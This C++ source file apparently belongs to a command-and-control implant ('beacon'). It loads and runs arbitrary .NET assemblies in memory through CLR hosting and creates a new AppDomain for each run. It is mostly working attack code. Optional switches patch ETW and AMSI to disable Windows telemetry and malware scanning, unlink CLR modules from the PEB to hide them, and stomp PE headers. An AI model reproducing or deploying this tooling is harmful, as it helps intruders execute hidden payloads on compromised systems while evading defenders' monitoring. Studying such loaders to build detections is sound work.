#include "HostCLR.h"
#include "Helpers.h"
#include <string>
#include "Util.h"
#include "PEModuleHelper.h"
#include "PatternScan.h"
#include "PEB.h"
#include "syscalls.h"

const char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
const char v2[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };

// Track if CLR has been initialized and patched
static BOOL g_clrInitialized = FALSE;
static BOOL g_etwPatched = FALSE;
static BOOL g_amsiPatched = FALSE;
static ICorRuntimeHost* g_pRuntimeHost = NULL;
static DWORD g_appDomainCounter = 0;

// Helper function to validate assembly architecture compatibility
static int validateAssemblyArchitecture(LPSTR assemblyBytes, ULONG assemblyLength, char* errorMsg, size_t errorMsgSize) {
	if (assemblyLength < 0x100 || assemblyBytes[0] != 'M' || assemblyBytes[1] != 'Z') {
		snprintf(errorMsg, errorMsgSize, "[!] Invalid PE file - missing MZ header");
		return -1;
	}

	DWORD peOffset = *(DWORD*)(assemblyBytes + 0x3C);
	if (peOffset >= assemblyLength - 4) {
		snprintf(errorMsg, errorMsgSize, "[!] Invalid PE file - PE header offset out of bounds");
		return -1;
	}

	DWORD peSignature = *(DWORD*)(assemblyBytes + peOffset);
	if (peSignature != 0x00004550) {
		snprintf(errorMsg, errorMsgSize, "[!] Invalid PE file - bad PE signature (0x%08X)", peSignature);
		return -1;
	}

	WORD machine = *(WORD*)(assemblyBytes + peOffset + 4);
	WORD magic = *(WORD*)(assemblyBytes + peOffset + 24);

	// Check for CLR directory
	DWORD clrRVA = 0, clrSize = 0;
	if (magic == 0x010B) { // PE32
		clrRVA = *(DWORD*)(assemblyBytes + peOffset + 24 + 208);
		clrSize = *(DWORD*)(assemblyBytes + peOffset + 24 + 212);
	} else if (magic == 0x020B) { // PE32+
		clrRVA = *(DWORD*)(assemblyBytes + peOffset + 24 + 224);
		clrSize = *(DWORD*)(assemblyBytes + peOffset + 24 + 228);
	}

	if (clrRVA == 0 || clrSize == 0) {
		snprintf(errorMsg, errorMsgSize, "[!] Not a .NET assembly - no CLR directory found (native executable?)");
		return -1;
	}

	// Get host process architecture
	#ifdef _WIN64
		BOOL isHost64Bit = TRUE;
	#else
		BOOL isHost64Bit = FALSE;
	#endif

	// Parse CLR header to get CorFlags
	// First need to convert RVA to file offset - find the section containing this RVA
	WORD numSections = *(WORD*)(assemblyBytes + peOffset + 6);
	WORD optHeaderSize = *(WORD*)(assemblyBytes + peOffset + 20);
	DWORD sectionTableOffset = peOffset + 24 + optHeaderSize;
	
	DWORD clrFileOffset = 0;
	for (WORD i = 0; i < numSections; i++) {
		DWORD sectionOffset = sectionTableOffset + (i * 40);
		if (sectionOffset + 40 > assemblyLength) break;
		
		DWORD virtualSize = *(DWORD*)(assemblyBytes + sectionOffset + 8);
		DWORD virtualAddr = *(DWORD*)(assemblyBytes + sectionOffset + 12);
		DWORD rawDataPtr = *(DWORD*)(assemblyBytes + sectionOffset + 20);
		
		if (clrRVA >= virtualAddr && clrRVA < virtualAddr + virtualSize) {
			clrFileOffset = rawDataPtr + (clrRVA - virtualAddr);
			break;
		}
	}
	
	if (clrFileOffset > 0 && clrFileOffset + 16 <= assemblyLength) {
		// CLR header structure: https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/metadata/cor-ilmethod-structure
		// Offset 0: cb (size)
		// Offset 4: MajorRuntimeVersion
		// Offset 6: MinorRuntimeVersion
		// Offset 16: Flags (CorFlags)
		DWORD corFlags = *(DWORD*)(assemblyBytes + clrFileOffset + 16);
		
		// CorFlags bit meanings:
		// 0x01 = COMIMAGE_FLAGS_ILONLY
		// 0x02 = COMIMAGE_FLAGS_32BITREQUIRED  
		// 0x10000 = COMIMAGE_FLAGS_32BITPREFERRED
		
		BOOL ilOnly = (corFlags & 0x01) != 0;
		BOOL requires32Bit = (corFlags & 0x02) != 0;
		BOOL prefers32Bit = (corFlags & 0x10000) != 0;
		
		if (requires32Bit && isHost64Bit) {
			snprintf(errorMsg, errorMsgSize, "[!] Architecture mismatch: Assembly requires 32-bit (32BITREQ=1) but beacon is 64-bit");
			return -1;
		}
		
		// 32BITPREFERRED in a 64-bit process should work with ILONLY but may cause issues
		if (prefers32Bit && isHost64Bit && !ilOnly) {
			snprintf(errorMsg, errorMsgSize, "[!] Architecture warning: Assembly prefers 32-bit and is not pure IL - may fail in 64-bit process");
			return -1;
		}
	}

	// Check ILONLY flag in CLR header to determine if this is AnyCPU
	// For now we check machine type - PE32 with ILONLY is typically AnyCPU
	if (magic == 0x020B) {
		// PE32+ - This is a native 64-bit or .NET compiled for x64 only
		if (!isHost64Bit) {
			snprintf(errorMsg, errorMsgSize, "[!] Architecture mismatch: Assembly is 64-bit (PE32+) but beacon is 32-bit");
			return -1;
		}
	} else if (magic == 0x010B && machine == 0x014C) {
		// PE32 with x86 machine - could be AnyCPU or x86-only
		// AnyCPU .NET assemblies are PE32 but run on any architecture
		// We'll allow it since pure IL can run anywhere
	}

	return 0; // Valid
}

int InjectAssembly(LPSTR assemblyBytes, ULONG assemblyLength, LPSTR* arguments, size_t argsCount, const wchar_t* _unlinkmodules, const wchar_t* _stompheaders, const wchar_t* _amsi, const wchar_t* _etw) {
	
	char errorMsg[256] = {0};

	// Validate assembly architecture before doing anything else
	if (validateAssemblyArchitecture(assemblyBytes, assemblyLength, errorMsg, sizeof(errorMsg)) != 0) {
		printf("%s\n", errorMsg);
		fflush(stdout);
		return 0;
	}

	ICLRMetaHost* pMetaHost = NULL;
	ICLRRuntimeInfo* pRuntimeInfo = NULL;
	_MethodInfoPtr pMethodInfo = NULL;
	_AssemblyPtr pAssembly = NULL;
	_AppDomainPtr pAppDomain = NULL;
	IUnknownPtr pAppDomainThunk = NULL;
	HRESULT hr;
	BOOL createdNewAppDomain = FALSE;

	// Initialize CLR if not already done
	if (!g_clrInitialized) {
		if (!_CLRCreateInstance(&pMetaHost)) {
			printf("[!] CLRCreateInstance failed\n");
			fflush(stdout);
			return -1;
		}

		IEnumUnknown* pRuntimeEnum;
		if (!_EnumLoadedRuntimes(&pRuntimeEnum, pMetaHost)){
			pMetaHost->Release();
			return 0;
		}

		// Extract which CLR version used to build the .net assembly
		bool _isCLRV4 = false;
		_isCLRV4 = checkCLRVersion(assemblyBytes, assemblyLength, v4, sizeof(v4));
		LPWSTR _version = _isCLRV4 ? L"v4.0.30319" : L"v2.0.50727";

		// Check if CLR is already loaded
		BOOL _isCLRLoaded = isCLRLoaded(_version, pRuntimeEnum, (PVOID*)&pRuntimeInfo);

		if (!_isCLRLoaded) {
			if (!_GetRuntime(pMetaHost, &pRuntimeInfo, _version)) {
				printf("[!] GetRuntime failed\n"); fflush(stdout);
				pRuntimeEnum->Release();
				pMetaHost->Release();
				return 0;
			}

			if (!_isLoadable(pRuntimeInfo)) {
				printf("[!] Runtime is not loadable\n"); fflush(stdout);
				pRuntimeEnum->Release();
				pMetaHost->Release();
				return 0;
			}
		}

		if (pRuntimeInfo == NULL) {
			printf("[!] Failed to obtain runtime info\n"); fflush(stdout);
			pRuntimeEnum->Release();
			pMetaHost->Release();
			return 0;
		}

		if (!_GetInterface(&g_pRuntimeHost, pRuntimeInfo)){
			printf("[!] GetInterface failed\n"); fflush(stdout);
			pRuntimeEnum->Release();
			pMetaHost->Release();
			return 0;
		}

		if (!_isCLRLoaded) {
			if (!_StartRuntimeHost(g_pRuntimeHost)) {
				printf("[!] StartRuntimeHost failed\n"); fflush(stdout);
				pRuntimeEnum->Release();
				pMetaHost->Release();
				return 0;
			}

			// ETW patching - only on first CLR init
			if (*_etw == '1' && !g_etwPatched) {
				patchEtw();
				g_etwPatched = TRUE;
			}
		}

		pRuntimeEnum->Release();
		pMetaHost->Release();
		g_clrInitialized = TRUE;
		printf("[+] CLR initialized successfully\n");
		fflush(stdout);
	} else {
		printf("[+] Using existing CLR instance\n");
		fflush(stdout);
	}

	// AMSI patching - can be done anytime, but only once
	if (*_amsi == '1' && !g_amsiPatched) {
		patchAmci();
		g_amsiPatched = TRUE;
	}

	// Create a NEW AppDomain for this execution to provide isolation
	g_appDomainCounter++;
	WCHAR appDomainName[64];
	swprintf_s(appDomainName, 64, L"AssemblyDomain_%lu", g_appDomainCounter);
	
	printf("[+] Creating new AppDomain: %ls\n", appDomainName);
	fflush(stdout);

	hr = g_pRuntimeHost->CreateDomain(appDomainName, NULL, &pAppDomainThunk);
	if (FAILED(hr)) {
		printf("[!] CreateDomain failed, HRESULT: 0x%08X\n", hr);
		printf("[!] Falling back to default AppDomain\n");
		fflush(stdout);
		
		// Fall back to default domain if CreateDomain fails
		if (!_GetDefaultDomain(g_pRuntimeHost, &pAppDomainThunk)) {
			printf("[!] GetDefaultDomain also failed\n"); fflush(stdout);
			return 0;
		}
	} else {
		createdNewAppDomain = TRUE;
	}

	if (!_QueryInterface(&pAppDomain, pAppDomainThunk)) {
		printf("[!] QueryInterface failed\n"); fflush(stdout);
		return 0;
	}

	SAFEARRAYBOUND rgsabound[1];
	rgsabound[0].cElements = assemblyLength;
	rgsabound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
	if (pSafeArray == NULL) {
		printf("[!] SafeArrayCreate failed\n"); fflush(stdout);
		return 0;
	}
	
	PVOID pvData = NULL;
	if (!_SafeArrayAccessData(&pSafeArray, &pvData)) {
		SafeArrayDestroy(pSafeArray);
		return 0;
	}

	memcpy(pvData, assemblyBytes, assemblyLength);
	if (!_SafeArrayUnaccessData(pSafeArray)) {
		SafeArrayDestroy(pSafeArray);
		return 0;
	}

	if (!_Load(pAppDomain, pSafeArray, &pAssembly)) {
		SafeArrayDestroy(pSafeArray);
		return 0;
	}
	
	SafeArrayDestroy(pSafeArray);
	pSafeArray = NULL;

	if (!_GetEntryPoint(pAssembly, &pMethodInfo)) {
		return 0;
	}

	// Setting entrypoint method parameters
	SAFEARRAY *params = setEntrypointParams(arguments, argsCount);

	// Unlink CLR Modules - only on first run
	if (*_unlinkmodules == '1') {
		static BOOL unlinked = FALSE;
		if (!unlinked) {
			unlinkModules();
			_separator();
			fflush(stdout);
			unlinked = TRUE;
		}
	}

	// Stomping PE DOS Headers - only on first run
	if (*_stompheaders == '1') {
		static BOOL stomped = FALSE;
		if (!stomped) {
			stompHeaders();
			_separator();
			fflush(stdout);
			stomped = TRUE;
		}
	}

	// Invoke entrypoint method with params
	VARIANT retVal, obj;
	ZeroMemory(&retVal, sizeof(VARIANT));
	ZeroMemory(&obj, sizeof(VARIANT));
	obj.vt = VT_NULL;

	hr = pMethodInfo->Invoke_3(obj, params, &retVal);

	// Clean up params
	if (params) SafeArrayDestroy(params);

	if (FAILED(hr)) {
		printf("[!] pMethodInfo->Invoke_3(...) failed, hr = %X\n", hr);
		if (hr == 0x80131604) {
			printf("[!] COR_E_TYPEINITIALIZATION - Assembly's type initializer threw an exception\n");
		}
		fflush(stdout);
		
		// Still try to unload the AppDomain on failure
		if (createdNewAppDomain && pAppDomainThunk) {
			g_pRuntimeHost->UnloadDomain(pAppDomain);
		}
		return 0;
	}

	printf("[+] Assembly execution completed successfully\n");
	fflush(stdout);

	// Unload the AppDomain to clean up - this allows running assemblies again
	if (createdNewAppDomain) {
		printf("[+] Unloading AppDomain: %ls\n", appDomainName);
		fflush(stdout);
		
		// Release references before unloading
		pMethodInfo = NULL;
		pAssembly = NULL;
		pAppDomain = NULL;
		
		hr = g_pRuntimeHost->UnloadDomain(pAppDomainThunk);
		if (FAILED(hr)) {
			printf("[!] Warning: UnloadDomain failed, hr = 0x%08X\n", hr);
			fflush(stdout);
		}
	}

	return 1;
}

BOOL _CLRCreateInstance(ICLRMetaHost** pMetaHost) {

	HRESULT hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (PVOID*)pMetaHost);
	if (FAILED(hr)) {
		printf("[!] CLRCreateInstance(...) failed\n");
		fflush(stdout);
		return 0;
	}

	return 1;

}

BOOL _EnumLoadedRuntimes(IEnumUnknown** pRuntimeEnum, ICLRMetaHost* pMetaHost) {

	HRESULT hr = pMetaHost->EnumerateLoadedRuntimes(NtGetCurrentProcess(), pRuntimeEnum);
	if (FAILED(hr)) {
		printf("[!]: EnumerateLoadedRuntimes failed w/hr 0x%08lx\n", hr);
		fflush(stdout);
		return 0;
	}

	return 1;
}

BOOL _GetRuntime(ICLRMetaHost* pMetaHost, ICLRRuntimeInfo** pRuntimeInfo, LPWSTR _version) {

	HRESULT hr = pMetaHost->GetRuntime(_version, IID_ICLRRuntimeInfo, (PVOID*)pRuntimeInfo);
	if (FAILED(hr)) {
		printf("[!] pMetaHost->GetRuntime(...) failed\n");
		fflush(stdout);
		return 0;
	}

	return 1;
}

BOOL _isLoadable(ICLRRuntimeInfo* pRuntimeInfo) {

	BOOL bLoadable;
	HRESULT hr = pRuntimeInfo->IsLoadable(&bLoadable);
	if (FAILED(hr) || !bLoadable) {
		return 0;
	}

	return 1;
}

BOOL _GetInterface(ICorRuntimeHost** pRuntimeHost, ICLRRuntimeInfo* pRuntimeInfo) {

	HRESULT hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (PVOID*)pRuntimeHost);
	if (FAILED(hr)) {
		return 0;
	}

	return 1;
}

BOOL _StartRuntimeHost(ICorRuntimeHost* pRuntimeHost) {

	HRESULT hr = pRuntimeHost->Start();
	if (FAILED(hr)) {
		return 0;
	}

	return 1;
}

BOOL isCLRLoaded(LPWSTR version, IEnumUnknown* pEnumerator, LPVOID* pRuntimeInfo) {

	WCHAR wszVersion[100];
	DWORD cchVersion = ARRLEN(wszVersion);
	IUnknown * pUnk = NULL;
	BOOL _found = FALSE;
	HRESULT hr;

	while (pEnumerator->Next(1, &pUnk, NULL) == S_OK) {
		hr = pUnk->QueryInterface(IID_ICLRRuntimeInfo, pRuntimeInfo);

		if (SUCCEEDED(hr)) {
			cchVersion = ARRLEN(wszVersion);
			hr = ((ICLRRuntimeInfo*)*pRuntimeInfo)->GetVersionString(wszVersion, &cchVersion);
			if (SUCCEEDED(hr) && wcscmp(wszVersion, version) == 0) {
				_found = TRUE;
				break;
			}
		}
	}

	return _found;
}

BOOL _GetDefaultDomain(ICorRuntimeHost* pRuntimeHost, IUnknown** pAppDomainThunk) {

	HRESULT hr = pRuntimeHost->GetDefaultDomain(pAppDomainThunk);
	if (FAILED(hr)) {
		return 0;
	}

	return 1;
}

BOOL _QueryInterface(_AppDomain** pDefaultAppDomain, IUnknown* pAppDomainThunk) {

	HRESULT hr = pAppDomainThunk->QueryInterface(__uuidof(_AppDomain), (PVOID*)pDefaultAppDomain);
	if (FAILED(hr)) {
		return 0;
	}

	return 1;
}

BOOL _SafeArrayAccessData(SAFEARRAY** pSafeArray, PVOID* pvData) {

	HRESULT hr = SafeArrayAccessData(*pSafeArray, pvData);
	if (FAILED(hr)) {
		return 0;
	}

	return 1;
}

BOOL _SafeArrayUnaccessData(SAFEARRAY* pSafeArray) {

	HRESULT hr = SafeArrayUnaccessData(pSafeArray);
	if (FAILED(hr)) {
		return 0;
	}

	return 1;
}

BOOL _Load(_AppDomain* pDefaultAppDomain, SAFEARRAY* pSafeArray, _Assembly** pAssembly) {

	HRESULT hr = pDefaultAppDomain->Load_3(pSafeArray, pAssembly);
	if (FAILED(hr)) {
		printf("[!] Load_3 failed, HRESULT: 0x%08X\n", hr);
		// Additional error info for common errors
		if (hr == 0x80131604) {
			printf("[!] COR_E_TYPEINITIALIZATION - Assembly's type initializer threw an exception\n");
			printf("[!] This can happen when re-loading an assembly that was already loaded\n");
		} else if (hr == 0x80131040) {
			printf("[!] FUSION_E_REF_DEF_MISMATCH - Assembly reference mismatch\n");
		} else if (hr == 0x80131522) {
			printf("[!] COR_E_BADIMAGEFORMAT - Bad assembly format or architecture mismatch\n");
		}
		fflush(stdout);
		return 0;
	}
	return 1;
}

BOOL _GetEntryPoint(_Assembly* pAssembly, _MethodInfo** pMethodInfo) {

	HRESULT hr = pAssembly->get_EntryPoint(pMethodInfo);
	if (FAILED(hr)) {
		printf("[!] get_EntryPoint failed\n");
		fflush(stdout);
		return 0;
	}

	return 1;
}

SAFEARRAY* setEntrypointParams(LPSTR* arguments, size_t argsCount) {

	VARIANT args;
	args.vt = VT_ARRAY | VT_BSTR;
	SAFEARRAYBOUND argsBound[1];
	argsBound[0].lLbound = 0;
	size_t argsLength = arguments != NULL ? argsCount : 0;
	argsBound[0].cElements = argsLength;
	args.parray = SafeArrayCreate(VT_BSTR, 1, argsBound);
	LONG idx[1];
	for (size_t i = 0; i < argsLength; i++) {
		idx[0] = i;
		SafeArrayPutElement(args.parray, idx, SysAllocString(_bstr_t(arguments[i]).Detach()));
	}
	SAFEARRAY* params = NULL;
	SAFEARRAYBOUND paramsBound[1];
	paramsBound[0].lLbound = 0;
	paramsBound[0].cElements = 1;
	params = SafeArrayCreate(VT_VARIANT, 1, paramsBound);
	idx[0] = 0;
	SafeArrayPutElement(params, idx, &args);

	ZeroMemory(&args, sizeof(VARIANT));

	return params;
}

void stompHeaders() {
	OBJECT_ATTRIBUTES attributes;
	InitializeObjectAttributes(&attributes, NULL, 0, NULL, NULL);

	CLIENT_ID clientId = { 0 };
	clientId.UniqueProcess = (HANDLE)NtGetCurrentProcessId(NtGetCurrentProcess());
	clientId.UniqueThread = NULL;
	HANDLE phProcess = NULL;
	NtOpenProcess(&phProcess, PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &attributes, &clientId);

	StompPEHeaders(phProcess);
}

void unlinkModules() {
	printf("[+]: Scanning for any loaded modules with the name '*clr*', '*mscoree*'...\n");
	printf("[+] Unlinking CLR related modules from PEB\n");
	fflush(stdout);

	UnlinkModuleWithStr("clr");
	UnlinkModuleWithStr("mscore");
}

void cleanup(SAFEARRAY* params, ICorRuntimeHost* pRuntimeHost, ICLRRuntimeInfo* pRuntimeInfo, ICLRMetaHost* pMetaHost, IEnumUnknown* pRuntimeEnum) {
	// Release COM interfaces - do NOT stop the runtime
	if (pRuntimeEnum) pRuntimeEnum->Release();
	if (pMetaHost) pMetaHost->Release();
	// CRITICAL: Do NOT call pRuntimeHost->Stop() - this breaks subsequent executions
	// The CLR must remain running for the lifetime of the process
	if (pRuntimeHost) pRuntimeHost->Release();
	if (params) SafeArrayDestroy(params);
}









